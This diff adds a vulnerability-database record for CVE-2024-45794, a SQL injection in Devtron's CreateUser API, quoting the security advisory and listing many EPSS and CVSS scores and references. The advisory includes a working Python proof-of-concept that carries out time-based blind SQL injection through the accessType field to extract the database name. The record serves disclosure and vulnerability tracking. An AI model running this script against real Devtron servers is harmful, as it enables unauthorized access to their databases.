@@ -1,0 +1,373 @@
+vulnerability_id: VCID-rrg8-v6x6-ruam
+aliases:
+  - CVE-2024-45794
+  - GHSA-q78v-cv36-8fxj
+summary: |
+  Devtron has SQL Injection in CreateUser API
+  ### Summary
+  An authenticated user (with minimum permission) could utilize and exploit SQL Injection to allow the execution of malicious SQL queries via CreateUser API (/orchestrator/user).
+
+  ### Details
+  The API is CreateUser (/orchestrator/user).
+
+  The function to read user input is:
+  https://github.com/devtron-labs/devtron/blob/4296366ae288f3a67f87e547d2b946acbcd2dd65/api/auth/user/UserRestHandler.go#L96-L104
+
+  The userInfo (line 104) parameter can be controlled by users.
+
+  The SQL injection can happen in the code:
+  https://github.com/devtron-labs/devtron/blob/4296366ae288f3a67f87e547d2b946acbcd2dd65/pkg/auth/user/repository/UserAuthRepository.go#L1038
+
+  The query (line 1038) parameter can be controlled by a user to create and execute a malicious SQL query.
+
+  The user should be authenticated but only needs minimum permissions:
+  ![image](https://github.com/user-attachments/assets/08ba940e-33a8-408d-9a1e-9cd1504b95c5)
+
+
+  ### PoC
+
+  Demonstrate a blind SQL injection to retrieve the database name:
+
+  ```
+  import requests
+  import time
+  import string
+  import argparse
+
+  def blind(ip, token, query):
+      url = f"http://{ip}/orchestrator/user"
+      headers = {"token": token}
+      entity = "chart-group"
+      payload = f"'; {query} --"
+
+      data = {"id": 111, "email_id": "abcd123@126.com", "superAdmin": False, "roleFilters":[{"team":"", "environment":"", "action": "", "entity": entity, "accessType": payload}]} #"EntityName": "test", "AccessType": "test", "Cluster": "",\"NameSpace": "devtroncd", "Group": "", "Kind": "", "Resource": "", "Workflow": ""
+      start = time.time()
+      res = requests.post(url, headers=headers, json = data)
+      end = time.time()
+      #print(res.content)
+      if(end - start > 1):
+          return True
+      return False
+
+  def main(ip, token):
+      chs = string.printable
+      result = ""
+      is_end = False
+      i = 1
+      while(not is_end):
+          is_end = True
+          for ch in chs:
+              if(blind(ip, token, f"select case when substring(datname,{i},1)='{ch}' then pg_sleep(1) else pg_sleep(0) end from pg_database limit 1;")):
+                  print(ch)
+                  result += ch
+                  is_end = False
+                  break
+          i += 1
+      print(result)
+
+  if __name__ == "__main__":
+      argparser = argparse.ArgumentParser()
+      argparser.add_argument("--ip", "-i", type=str, help="Target IP")
+      argparser.add_argument("--token", "-t", type=str, help="API TOKEN")
+      args = argparser.parse_args()
+      main(args.ip, args.token)
+  ```
+
+  The debugging breakpoint indicated that the malicious SQL query was executed:
+  ![image](https://github.com/user-attachments/assets/c9067360-8fb3-4d64-82e9-3af1e5e60969)
+
+  We can see that we can get the database name:
+  ![image](https://github.com/user-attachments/assets/29d5d969-876a-452d-be7f-8984d2a28c25)
+
+
+  ### Impact
+  SQL injection vulnerability. Our tests indicate that the latest version is affected.
+
+  The reporters are Yuan Luo, Shuai Xiong from Tencent YunDing Security Lab.
+severities:
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10484'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10843'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10939'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10859'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10875'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10932'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.11287'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10429'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10788'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10184'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10278'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10302'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10364'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10366'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10377'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00077'
+    scoring_system: epss
+    scoring_elements: '0.23853'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00077'
+    scoring_system: epss
+    scoring_elements: '0.23914'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31424'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31474'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31458'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.3144'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31437'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31441'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31459'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31408'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31528'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31522'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.31451'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00116'
+    scoring_system: epss
+    scoring_elements: '0.2731'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00116'
+    scoring_system: epss
+    scoring_elements: '0.27356'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00116'
+    scoring_system: epss
+    scoring_elements: '0.27455'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00116'
+    scoring_system: epss
+    scoring_elements: '0.27469'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00116'
+    scoring_system: epss
+    scoring_elements: '0.2748'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00116'
+    scoring_system: epss
+    scoring_elements: '0.2749'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29353'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29388'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29417'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29416'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29389'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29374'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29348'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.0013'
+    scoring_system: epss
+    scoring_elements: '0.29383'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '0.00331'
+    scoring_system: epss
+    scoring_elements: '0.39291'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+  - score: '8.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    published_at: None
+    url: https://github.com/devtron-labs/devtron
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/devtron-labs/devtron
+  - score: '8.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    published_at: None
+    url: https://github.com/devtron-labs/devtron/commit/1540271bd777b6bccd288e513a9070d8f04b6056
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/devtron-labs/devtron/commit/1540271bd777b6bccd288e513a9070d8f04b6056
+  - score: '8.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    published_at: None
+    url: https://github.com/devtron-labs/devtron/security/advisories/GHSA-q78v-cv36-8fxj
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/devtron-labs/devtron/security/advisories/GHSA-q78v-cv36-8fxj
+  - score: Track*
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2024-11-07T19:31:00Z/
+    published_at: None
+    url: https://github.com/devtron-labs/devtron/security/advisories/GHSA-q78v-cv36-8fxj
+  - score: '8.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-45794
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-45794
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-45794
+weaknesses:
+  - CWE-89
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-45794
+    reference_type:
+    reference_id:
+  - url: https://github.com/devtron-labs/devtron
+    reference_type:
+    reference_id:
+  - url: https://github.com/devtron-labs/devtron/commit/1540271bd777b6bccd288e513a9070d8f04b6056
+    reference_type:
+    reference_id:
+  - url: https://github.com/devtron-labs/devtron/security/advisories/GHSA-q78v-cv36-8fxj
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-45794
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:devtron:devtron:*:*:*:*:*:kubernetes:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:devtron:devtron:*:*:*:*:*:kubernetes:*:*
